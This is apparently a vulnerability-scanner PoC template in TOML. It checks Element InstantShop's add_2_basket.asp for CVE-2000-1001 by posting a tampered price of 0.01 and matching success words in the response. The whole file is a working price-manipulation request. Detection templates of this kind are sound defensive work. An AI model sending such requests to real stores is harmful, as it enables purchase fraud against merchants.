[info]
author = "AVE"
description = "检测 Element InstantShop add_2_basket.asp 页面是否存在价格隐藏字段未校验漏洞，通过修改 price 参数值尝试以低价将商品加入购物车"
id = "POC-AVE-2000-1042"
name = "Element InstantShop 商品价格篡改漏洞 PoC"
severity = "high"
tags = ["ave-2000-1042"]
vuln_id = [
    "CVE-2000-1001",
    "AVE-2000-1042",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/add_2_basket.asp"
protocol = "http"

[poc.requests.body]
content = "product_id=1&price=0.01&quantity=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "basket",
    "added",
    "success",
    "cart",
]
